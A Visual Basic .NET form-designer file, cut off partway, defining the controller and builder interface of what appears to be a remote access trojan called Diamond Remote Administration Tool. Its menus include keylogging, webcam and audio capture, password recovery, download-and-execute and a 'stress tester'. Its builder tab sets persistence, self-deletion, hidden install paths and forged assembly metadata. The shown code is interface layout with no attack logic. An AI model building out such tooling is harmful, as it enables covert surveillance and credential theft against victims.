<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Das Formular überschreibt den Löschvorgang, um die Komponentenliste zu bereinigen.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Wird vom Windows Form-Designer benötigt.
    Private components As System.ComponentModel.IContainer

    'Hinweis: Die folgende Prozedur ist für den Windows Form-Designer erforderlich.
    'Das Bearbeiten ist mit dem Windows Form-Designer möglich.  
    'Das Bearbeiten mit dem Code-Editor ist nicht möglich.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.countryflags = New System.Windows.Forms.ImageList(Me.components)
        Me.RightclickMain = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.GroupByToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CountryToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.OperatingSystemToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PrivilegsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ViewThumbnailsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SystemInformationToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SurveillanceToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteDesktopToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteKeyloggerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.AudioCaptureToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteWebcamToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PasswordRecoveryToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ServerOptionsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UpdateServerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromURLToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ExecuteFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromFileToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromURLToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.PingToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UninstallToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RestartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MiscellaneousToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MiscellaneousToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.FunFunctionsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ScriptingToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UserInputToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteChatToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MessageBoxToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.StressTesterToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MapViewToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Notify = New System.Windows.Forms.NotifyIcon(Me.components)
        Me.Rightclick_OnConnect = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.OpenUrlToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DownloadExecuteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ShoweMessageBoxToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoveActionToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DisableActionToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.EnableActionToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CodePlexTabControl1 = New Diamond_Remote_Administration_Tool.CodePlexTabControl()
        Me.TabClient = New System.Windows.Forms.TabPage()
        Me.ListView1 = New System.Windows.Forms.ListView()
        Me.ColumnHeader1 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader2 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader3 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader4 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader5 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader6 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader7 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader8 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader9 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.TabBuilder = New System.Windows.Forms.TabPage()
        Me.DotNetBarTabcontrol1 = New Diamond_Remote_Administration_Tool.DotNetBarTabcontrol()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.tb_ip = New System.Windows.Forms.ComboBox()
        Me.RandomPool1 = New Diamond_Remote_Administration_Tool.RandomPool()
        Me.tb_mutex = New System.Windows.Forms.TextBox()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.NumericUpDown2 = New System.Windows.Forms.NumericUpDown()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.rb_programs = New System.Windows.Forms.RadioButton()
        Me.rb_programfiles = New System.Windows.Forms.RadioButton()
        Me.rb_temp = New System.Windows.Forms.RadioButton()
        Me.rb_appdataroaming = New System.Windows.Forms.RadioButton()
        Me.rb_appdata = New System.Windows.Forms.RadioButton()
        Me.Label9 = New System.Windows.Forms.Label()
        Me.nud_delay = New System.Windows.Forms.NumericUpDown()
        Me.cb_delay = New System.Windows.Forms.CheckBox()
        Me.cb_melt = New System.Windows.Forms.CheckBox()
        Me.cb_persistence = New System.Windows.Forms.CheckBox()
        Me.rb_hkeylocal = New System.Windows.Forms.RadioButton()
        Me.rb_hkeyuser = New System.Windows.Forms.RadioButton()
        Me.rb_Startupfolder = New System.Windows.Forms.RadioButton()
        Me.cb_enablestartup = New System.Windows.Forms.CheckBox()
        Me.tb_execname = New System.Windows.Forms.TextBox()
        Me.Label8 = New System.Windows.Forms.Label()
        Me.tb_subfoldername = New System.Windows.Forms.TextBox()
        Me.cb_dropinsubfolder = New System.Windows.Forms.CheckBox()
        Me.Label7 = New System.Windows.Forms.Label()
        Me.cb_installenable = New System.Windows.Forms.CheckBox()
        Me.TabPage3 = New System.Windows.Forms.TabPage()
        Me.GroupBox7 = New System.Windows.Forms.GroupBox()
        Me.RichTextBox1 = New System.Windows.Forms.RichTextBox()
        Me.cb_compress = New System.Windows.Forms.CheckBox()
        Me.btn_build = New System.Windows.Forms.Button()
        Me.GroupBox6 = New System.Windows.Forms.GroupBox()
        Me.Label18 = New System.Windows.Forms.Label()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.GroupBox5 = New System.Windows.Forms.GroupBox()
        Me.btn_generate = New System.Windows.Forms.Button()
        Me.tb_assemblyfileversion = New System.Windows.Forms.MaskedTextBox()
        Me.tb_assemblyversion = New System.Windows.Forms.MaskedTextBox()
        Me.Label11 = New System.Windows.Forms.Label()
        Me.Label10 = New System.Windows.Forms.Label()
        Me.Label12 = New System.Windows.Forms.Label()
        Me.Label13 = New System.Windows.Forms.Label()
        Me.Label14 = New System.Windows.Forms.Label()
        Me.Label15 = New System.Windows.Forms.Label()
        Me.Label16 = New System.Windows.Forms.Label()
        Me.Label17 = New System.Windows.Forms.Label()
        Me.tb_assemblytrademark = New System.Windows.Forms.TextBox()
        Me.tb_assemblycopyright = New System.Windows.Forms.TextBox()
        Me.tb_assemblyproduct = New System.Windows.Forms.TextBox()
        Me.tb_assemblycompany = New System.Windows.Forms.TextBox()
        Me.tb_assemblydescription = New System.Windows.Forms.TextBox()
        Me.tb_assemblytitle = New System.Windows.Forms.TextBox()
        Me.TabSettings = New System.Windows.Forms.TabPage()
        Me.GroupBox4 = New System.Windows.Forms.GroupBox()
        Me.Label19 = New System.Windows.Forms.Label()
        Me.PictureBox2 = New System.Windows.Forms.PictureBox()
        Me.GroupBox3 = New System.Windows.Forms.GroupBox()
        Me.ListViewOnConnect = New System.Windows.Forms.ListView()
        Me.ColumnHeader10 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader11 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader12 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
        Me.cb_PlaySound = New System.Windows.Forms.CheckBox()
        Me.cb_ShowNotification = New System.Windows.Forms.CheckBox()
        Me.cb_autolistening = New System.Windows.Forms.CheckBox()
        Me.btn_stoplistening = New System.Windows.Forms.Button()
        Me.btn_startlistening = New System.Windows.Forms.Button()
        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
        Me.NumericUpDown1 = New System.Windows.Forms.NumericUpDown()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.RightclickMain.SuspendLayout()
        Me.Rightclick_OnConnect.SuspendLayout()
        Me.CodePlexTabControl1.SuspendLayout()
        Me.TabClient.SuspendLayout()
        Me.TabBuilder.SuspendLayout()
        Me.DotNetBarTabcontrol1.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        CType(Me.NumericUpDown2, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage2.SuspendLayout()
        Me.Panel1.SuspendLayout()
        CType(Me.nud_delay, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage3.SuspendLayout()
        Me.GroupBox7.SuspendLayout()
        Me.GroupBox6.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GroupBox5.SuspendLayout()
        Me.TabSettings.SuspendLayout()
        Me.GroupBox4.SuspendLayout()
        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GroupBox3.SuspendLayout()
        Me.GroupBox1.SuspendLayout()
        Me.GroupBox2.SuspendLayout()
        CType(Me.NumericUpDown1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'countryflags
        '
        Me.countryflags.ImageStream = CType(resources.GetObject("countryflags.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.countryflags.TransparentColor = System.Drawing.Color.Transparent
        Me.countryflags.Images.SetKeyName(0, "ad.png")
        Me.countryflags.Images.SetKeyName(1, "ae.png")
        Me.countryflags.Images.SetKeyName(2, "af.png")
        Me.countryflags.Images.SetKeyName(3, "ag.png")
        Me.countryflags.Images.SetKeyName(4, "ai.png")
        Me.countryflags.Images.SetKeyName(5, "al.png")
        Me.countryflags.Images.SetKeyName(6, "am.png")
        Me.countryflags.Images.SetKeyName(7, "an.png")
        Me.countryflags.Images.SetKeyName(8, "ao.png")
        Me.countryflags.Images.SetKeyName(9, "ar.png")
        Me.countryflags.Images.SetKeyName(10, "as.png")
        Me.countryflags.Images.SetKeyName(11, "at.png")
        Me.countryflags.Images.SetKeyName(12, "au.png")
        Me.countryflags.Images.SetKeyName(13, "aw.png")
        Me.countryflags.Images.SetKeyName(14, "ax.png")
        Me.countryflags.Images.SetKeyName(15, "az.png")
        Me.countryflags.Images.SetKeyName(16, "ba.png")
        Me.countryflags.Images.SetKeyName(17, "bb.png")
        Me.countryflags.Images.SetKeyName(18, "bd.png")
        Me.countryflags.Images.SetKeyName(19, "be.png")
        Me.countryflags.Images.SetKeyName(20, "bf.png")
        Me.countryflags.Images.SetKeyName(21, "bg.png")
        Me.countryflags.Images.SetKeyName(22, "bh.png")
        Me.countryflags.Images.SetKeyName(23, "bi.png")
        Me.countryflags.Images.SetKeyName(24, "bj.png")
        Me.countryflags.Images.SetKeyName(25, "bm.png")
        Me.countryflags.Images.SetKeyName(26, "bn.png")
        Me.countryflags.Images.SetKeyName(27, "bo.png")
        Me.countryflags.Images.SetKeyName(28, "br.png")
        Me.countryflags.Images.SetKeyName(29, "bs.png")
        Me.countryflags.Images.SetKeyName(30, "bt.png")
        Me.countryflags.Images.SetKeyName(31, "bv.png")
        Me.countryflags.Images.SetKeyName(32, "bw.png")
        Me.countryflags.Images.SetKeyName(33, "by.png")
        Me.countryflags.Images.SetKeyName(34, "bz.png")
        Me.countryflags.Images.SetKeyName(35, "ca.png")
        Me.countryflags.Images.SetKeyName(36, "catalonia.png")
        Me.countryflags.Images.SetKeyName(37, "cc.png")
        Me.countryflags.Images.SetKeyName(38, "cd.png")
        Me.countryflags.Images.SetKeyName(39, "cf.png")
        Me.countryflags.Images.SetKeyName(40, "cg.png")
        Me.countryflags.Images.SetKeyName(41, "ch.png")
        Me.countryflags.Images.SetKeyName(42, "ci.png")
        Me.countryflags.Images.SetKeyName(43, "ck.png")
        Me.countryflags.Images.SetKeyName(44, "cl.png")
        Me.countryflags.Images.SetKeyName(45, "cm.png")
        Me.countryflags.Images.SetKeyName(46, "cn.png")
        Me.countryflags.Images.SetKeyName(47, "co.png")
        Me.countryflags.Images.SetKeyName(48, "cr.png")
        Me.countryflags.Images.SetKeyName(49, "cs.png")
        Me.countryflags.Images.SetKeyName(50, "cu.png")
        Me.countryflags.Images.SetKeyName(51, "cv.png")
        Me.countryflags.Images.SetKeyName(52, "cx.png")
        Me.countryflags.Images.SetKeyName(53, "cy.png")
        Me.countryflags.Images.SetKeyName(54, "cz.png")
        Me.countryflags.Images.SetKeyName(55, "de.png")
        Me.countryflags.Images.SetKeyName(56, "dj.png")
        Me.countryflags.Images.SetKeyName(57, "dk.png")
        Me.countryflags.Images.SetKeyName(58, "dm.png")
        Me.countryflags.Images.SetKeyName(59, "do.png")
        Me.countryflags.Images.SetKeyName(60, "dz.png")
        Me.countryflags.Images.SetKeyName(61, "ec.png")
        Me.countryflags.Images.SetKeyName(62, "ee.png")
        Me.countryflags.Images.SetKeyName(63, "eg.png")
        Me.countryflags.Images.SetKeyName(64, "eh.png")
        Me.countryflags.Images.SetKeyName(65, "england.png")
        Me.countryflags.Images.SetKeyName(66, "er.png")
        Me.countryflags.Images.SetKeyName(67, "es.png")
        Me.countryflags.Images.SetKeyName(68, "et.png")
        Me.countryflags.Images.SetKeyName(69, "europeanunion.png")
        Me.countryflags.Images.SetKeyName(70, "fam.png")
        Me.countryflags.Images.SetKeyName(71, "fi.png")
        Me.countryflags.Images.SetKeyName(72, "fj.png")
        Me.countryflags.Images.SetKeyName(73, "fk.png")
        Me.countryflags.Images.SetKeyName(74, "fm.png")
        Me.countryflags.Images.SetKeyName(75, "fo.png")
        Me.countryflags.Images.SetKeyName(76, "fr.png")
        Me.countryflags.Images.SetKeyName(77, "ga.png")
        Me.countryflags.Images.SetKeyName(78, "gb.png")
        Me.countryflags.Images.SetKeyName(79, "gd.png")
        Me.countryflags.Images.SetKeyName(80, "ge.png")
        Me.countryflags.Images.SetKeyName(81, "gf.png")
        Me.countryflags.Images.SetKeyName(82, "gh.png")
        Me.countryflags.Images.SetKeyName(83, "gi.png")
        Me.countryflags.Images.SetKeyName(84, "gl.png")
        Me.countryflags.Images.SetKeyName(85, "gm.png")
        Me.countryflags.Images.SetKeyName(86, "gn.png")
        Me.countryflags.Images.SetKeyName(87, "gp.png")
        Me.countryflags.Images.SetKeyName(88, "gq.png")
        Me.countryflags.Images.SetKeyName(89, "gr.png")
        Me.countryflags.Images.SetKeyName(90, "gs.png")
        Me.countryflags.Images.SetKeyName(91, "gt.png")
        Me.countryflags.Images.SetKeyName(92, "gu.png")
        Me.countryflags.Images.SetKeyName(93, "gw.png")
        Me.countryflags.Images.SetKeyName(94, "gy.png")
        Me.countryflags.Images.SetKeyName(95, "hk.png")
        Me.countryflags.Images.SetKeyName(96, "hm.png")
        Me.countryflags.Images.SetKeyName(97, "hn.png")
        Me.countryflags.Images.SetKeyName(98, "hr.png")
        Me.countryflags.Images.SetKeyName(99, "ht.png")
        Me.countryflags.Images.SetKeyName(100, "hu.png")
        Me.countryflags.Images.SetKeyName(101, "id.png")
        Me.countryflags.Images.SetKeyName(102, "ie.png")
        Me.countryflags.Images.SetKeyName(103, "il.png")
        Me.countryflags.Images.SetKeyName(104, "in.png")
        Me.countryflags.Images.SetKeyName(105, "io.png")
        Me.countryflags.Images.SetKeyName(106, "iq.png")
        Me.countryflags.Images.SetKeyName(107, "ir.png")
        Me.countryflags.Images.SetKeyName(108, "is.png")
        Me.countryflags.Images.SetKeyName(109, "it.png")
        Me.countryflags.Images.SetKeyName(110, "jm.png")
        Me.countryflags.Images.SetKeyName(111, "jo.png")
        Me.countryflags.Images.SetKeyName(112, "jp.png")
        Me.countryflags.Images.SetKeyName(113, "ke.png")
        Me.countryflags.Images.SetKeyName(114, "kg.png")
        Me.countryflags.Images.SetKeyName(115, "kh.png")
        Me.countryflags.Images.SetKeyName(116, "ki.png")
        Me.countryflags.Images.SetKeyName(117, "km.png")
        Me.countryflags.Images.SetKeyName(118, "kn.png")
        Me.countryflags.Images.SetKeyName(119, "kp.png")
        Me.countryflags.Images.SetKeyName(120, "kr.png")
        Me.countryflags.Images.SetKeyName(121, "kw.png")
        Me.countryflags.Images.SetKeyName(122, "ky.png")
        Me.countryflags.Images.SetKeyName(123, "kz.png")
        Me.countryflags.Images.SetKeyName(124, "la.png")
        Me.countryflags.Images.SetKeyName(125, "lb.png")
        Me.countryflags.Images.SetKeyName(126, "lc.png")
        Me.countryflags.Images.SetKeyName(127, "li.png")
        Me.countryflags.Images.SetKeyName(128, "lk.png")
        Me.countryflags.Images.SetKeyName(129, "lr.png")
        Me.countryflags.Images.SetKeyName(130, "ls.png")
        Me.countryflags.Images.SetKeyName(131, "lt.png")
        Me.countryflags.Images.SetKeyName(132, "lu.png")
        Me.countryflags.Images.SetKeyName(133, "lv.png")
        Me.countryflags.Images.SetKeyName(134, "ly.png")
        Me.countryflags.Images.SetKeyName(135, "ma.png")
        Me.countryflags.Images.SetKeyName(136, "mc.png")
        Me.countryflags.Images.SetKeyName(137, "md.png")
        Me.countryflags.Images.SetKeyName(138, "me.png")
        Me.countryflags.Images.SetKeyName(139, "mg.png")
        Me.countryflags.Images.SetKeyName(140, "mh.png")
        Me.countryflags.Images.SetKeyName(141, "mk.png")
        Me.countryflags.Images.SetKeyName(142, "ml.png")
        Me.countryflags.Images.SetKeyName(143, "mm.png")
        Me.countryflags.Images.SetKeyName(144, "mn.png")
        Me.countryflags.Images.SetKeyName(145, "mo.png")
        Me.countryflags.Images.SetKeyName(146, "mp.png")
        Me.countryflags.Images.SetKeyName(147, "mq.png")
        Me.countryflags.Images.SetKeyName(148, "mr.png")
        Me.countryflags.Images.SetKeyName(149, "ms.png")
        Me.countryflags.Images.SetKeyName(150, "mt.png")
        Me.countryflags.Images.SetKeyName(151, "mu.png")
        Me.countryflags.Images.SetKeyName(152, "mv.png")
        Me.countryflags.Images.SetKeyName(153, "mw.png")
        Me.countryflags.Images.SetKeyName(154, "mx.png")
        Me.countryflags.Images.SetKeyName(155, "my.png")
        Me.countryflags.Images.SetKeyName(156, "mz.png")
        Me.countryflags.Images.SetKeyName(157, "na.png")
        Me.countryflags.Images.SetKeyName(158, "nc.png")
        Me.countryflags.Images.SetKeyName(159, "ne.png")
        Me.countryflags.Images.SetKeyName(160, "nf.png")
        Me.countryflags.Images.SetKeyName(161, "ng.png")
        Me.countryflags.Images.SetKeyName(162, "ni.png")
        Me.countryflags.Images.SetKeyName(163, "nl.png")
        Me.countryflags.Images.SetKeyName(164, "no.png")
        Me.countryflags.Images.SetKeyName(165, "np.png")
        Me.countryflags.Images.SetKeyName(166, "nr.png")
        Me.countryflags.Images.SetKeyName(167, "nu.png")
        Me.countryflags.Images.SetKeyName(168, "nz.png")
        Me.countryflags.Images.SetKeyName(169, "om.png")
        Me.countryflags.Images.SetKeyName(170, "pa.png")
        Me.countryflags.Images.SetKeyName(171, "pe.png")
        Me.countryflags.Images.SetKeyName(172, "pf.png")
        Me.countryflags.Images.SetKeyName(173, "pg.png")
        Me.countryflags.Images.SetKeyName(174, "ph.png")
        Me.countryflags.Images.SetKeyName(175, "pk.png")
        Me.countryflags.Images.SetKeyName(176, "pl.png")
        Me.countryflags.Images.SetKeyName(177, "pm.png")
        Me.countryflags.Images.SetKeyName(178, "pn.png")
        Me.countryflags.Images.SetKeyName(179, "pr.png")
        Me.countryflags.Images.SetKeyName(180, "ps.png")
        Me.countryflags.Images.SetKeyName(181, "pt.png")
        Me.countryflags.Images.SetKeyName(182, "pw.png")
        Me.countryflags.Images.SetKeyName(183, "py.png")
        Me.countryflags.Images.SetKeyName(184, "qa.png")
        Me.countryflags.Images.SetKeyName(185, "re.png")
        Me.countryflags.Images.SetKeyName(186, "ro.png")
        Me.countryflags.Images.SetKeyName(187, "rs.png")
        Me.countryflags.Images.SetKeyName(188, "ru.png")
        Me.countryflags.Images.SetKeyName(189, "rw.png")
        Me.countryflags.Images.SetKeyName(190, "sa.png")
        Me.countryflags.Images.SetKeyName(191, "sb.png")
        Me.countryflags.Images.SetKeyName(192, "sc.png")
        Me.countryflags.Images.SetKeyName(193, "scotland.png")
        Me.countryflags.Images.SetKeyName(194, "sd.png")
        Me.countryflags.Images.SetKeyName(195, "se.png")
        Me.countryflags.Images.SetKeyName(196, "sg.png")
        Me.countryflags.Images.SetKeyName(197, "sh.png")
        Me.countryflags.Images.SetKeyName(198, "si.png")
        Me.countryflags.Images.SetKeyName(199, "sj.png")
        Me.countryflags.Images.SetKeyName(200, "sk.png")
        Me.countryflags.Images.SetKeyName(201, "sl.png")
        Me.countryflags.Images.SetKeyName(202, "sm.png")
        Me.countryflags.Images.SetKeyName(203, "sn.png")
        Me.countryflags.Images.SetKeyName(204, "so.png")
        Me.countryflags.Images.SetKeyName(205, "sr.png")
        Me.countryflags.Images.SetKeyName(206, "st.png")
        Me.countryflags.Images.SetKeyName(207, "sv.png")
        Me.countryflags.Images.SetKeyName(208, "sy.png")
        Me.countryflags.Images.SetKeyName(209, "sz.png")
        Me.countryflags.Images.SetKeyName(210, "tc.png")
        Me.countryflags.Images.SetKeyName(211, "td.png")
        Me.countryflags.Images.SetKeyName(212, "tf.png")
        Me.countryflags.Images.SetKeyName(213, "tg.png")
        Me.countryflags.Images.SetKeyName(214, "th.png")
        Me.countryflags.Images.SetKeyName(215, "tj.png")
        Me.countryflags.Images.SetKeyName(216, "tk.png")
        Me.countryflags.Images.SetKeyName(217, "tl.png")
        Me.countryflags.Images.SetKeyName(218, "tm.png")
        Me.countryflags.Images.SetKeyName(219, "tn.png")
        Me.countryflags.Images.SetKeyName(220, "to.png")
        Me.countryflags.Images.SetKeyName(221, "tr.png")
        Me.countryflags.Images.SetKeyName(222, "tt.png")
        Me.countryflags.Images.SetKeyName(223, "tv.png")
        Me.countryflags.Images.SetKeyName(224, "tw.png")
        Me.countryflags.Images.SetKeyName(225, "tz.png")
        Me.countryflags.Images.SetKeyName(226, "ua.png")
        Me.countryflags.Images.SetKeyName(227, "ug.png")
        Me.countryflags.Images.SetKeyName(228, "um.png")
        Me.countryflags.Images.SetKeyName(229, "us.png")
        Me.countryflags.Images.SetKeyName(230, "uy.png")
        Me.countryflags.Images.SetKeyName(231, "uz.png")
        Me.countryflags.Images.SetKeyName(232, "va.png")
        Me.countryflags.Images.SetKeyName(233, "vc.png")
        Me.countryflags.Images.SetKeyName(234, "ve.png")
        Me.countryflags.Images.SetKeyName(235, "vg.png")
        Me.countryflags.Images.SetKeyName(236, "vi.png")
        Me.countryflags.Images.SetKeyName(237, "vn.png")
        Me.countryflags.Images.SetKeyName(238, "vu.png")
        Me.countryflags.Images.SetKeyName(239, "wales.png")
        Me.countryflags.Images.SetKeyName(240, "wf.png")
        Me.countryflags.Images.SetKeyName(241, "ws.png")
        Me.countryflags.Images.SetKeyName(242, "ye.png")
        Me.countryflags.Images.SetKeyName(243, "yt.png")
        Me.countryflags.Images.SetKeyName(244, "za.png")
        Me.countryflags.Images.SetKeyName(245, "zm.png")
        Me.countryflags.Images.SetKeyName(246, "zw.png")
        Me.countryflags.Images.SetKeyName(247, "fgr.png")
        '
        'RightclickMain
        '
        Me.RightclickMain.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.GroupByToolStripMenuItem, Me.ViewThumbnailsToolStripMenuItem, Me.SystemInformationToolStripMenuItem, Me.SurveillanceToolStripMenuItem, Me.ServerOptionsToolStripMenuItem, Me.MiscellaneousToolStripMenuItem, Me.UserInputToolStripMenuItem, Me.StressTesterToolStripMenuItem, Me.MapViewToolStripMenuItem})
        Me.RightclickMain.Name = "RightclickMain"
        Me.RightclickMain.Size = New System.Drawing.Size(179, 202)
        '
        'GroupByToolStripMenuItem
        '
        Me.GroupByToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.CountryToolStripMenuItem, Me.OperatingSystemToolStripMenuItem, Me.PrivilegsToolStripMenuItem})
        Me.GroupByToolStripMenuItem.Image = CType(resources.GetObject("GroupByToolStripMenuItem.Image"), System.Drawing.Image)
        Me.GroupByToolStripMenuItem.Name = "GroupByToolStripMenuItem"
        Me.GroupByToolStripMenuItem.Size = New System.Drawing.Size(178, 22)
        Me.GroupByToolStripMenuItem.Text = "Group By"
        '
        'CountryToolStripMenuItem
        '
        Me.CountryToolStripMenuItem.Image = CType(resources.GetObject("CountryToolStripMenuItem.Image"), System.Drawing.Image)
        Me.CountryToolStripMenuItem.Name = "CountryToolStripMenuItem"
        Me.CountryToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.CountryToolStripMenuItem.Text = "Country"
        '
        'OperatingSystemToolStripMenuItem
        '
        Me.OperatingSystemToolStripMenuItem.Image = CType(resources.GetObject("OperatingSystemToolStripMenuItem.Image"), System.Drawing.Image)
        Me.OperatingSystemToolStripMenuItem.Name = "OperatingSystemToolStripMenuItem"
        Me.OperatingSystemToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.OperatingSystemToolStripMenuItem.Text = "Operating System"
        '
        'PrivilegsToolStripMenuItem
        '
        Me.PrivilegsToolStripMenuItem.Image = CType(resources.GetObject("PrivilegsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.PrivilegsToolStripMenuItem.Name = "PrivilegsToolStripMenuItem"
        Me.PrivilegsToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.PrivilegsToolStripMenuItem.Text = "Privilegs"
        '
        'ViewThumbnailsToolStripMenuItem
        '
        Me.ViewThumbnailsToolStripMenuItem.Image = CType(resources.GetObject("ViewThumbnailsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ViewThumbnailsToolStripMenuItem.Name = "ViewThumbnailsToolStripMenuItem"
        Me.ViewThumbnailsToolStripMenuItem.Size = New System.Drawing.Size(178, 22)
        Me.ViewThumbnailsToolStripMenuItem.Text = "View Thumbnails"
        '
        'SystemInformationToolStripMenuItem
        '
        Me.SystemInformationToolStripMenuItem.Image = CType(resources.GetObject("SystemInformationToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SystemInformationToolStripMenuItem.Name = "SystemInformationToolStripMenuItem"
        Me.SystemInformationToolStripMenuItem.Size = New System.Drawing.Size(178, 22)
        Me.SystemInformationToolStripMenuItem.Text = "System Information"
        '
        'SurveillanceToolStripMenuItem
        '
        Me.SurveillanceToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RemoteDesktopToolStripMenuItem, Me.RemoteKeyloggerToolStripMenuItem, Me.AudioCaptureToolStripMenuItem, Me.RemoteWebcamToolStripMenuItem, Me.PasswordRecoveryToolStripMenuItem})
        Me.SurveillanceToolStripMenuItem.Image = CType(resources.GetObject("SurveillanceToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SurveillanceToolStripMenuItem.Name = "SurveillanceToolStripMenuItem"
        Me.SurveillanceToolStripMenuItem.Size = New System.Drawing.Size(178, 22)
        Me.SurveillanceToolStripMenuItem.Text = "Surveillance"
        '
        'RemoteDesktopToolStripMenuItem
        '
        Me.RemoteDesktopToolStripMenuItem.Image = CType(resources.GetObject("RemoteDesktopToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RemoteDesktopToolStripMenuItem.Name = "RemoteDesktopToolStripMenuItem"
        Me.RemoteDesktopToolStripMenuItem.Size = New System.Drawing.Size(175, 22)
        Me.RemoteDesktopToolStripMenuItem.Text = "Remote Desktop"
        '
        'RemoteKeyloggerToolStripMenuItem
        '
        Me.RemoteKeyloggerToolStripMenuItem.Image = CType(resources.GetObject("RemoteKeyloggerToolStripMenuItem.Image"), System.Drawing.Image)
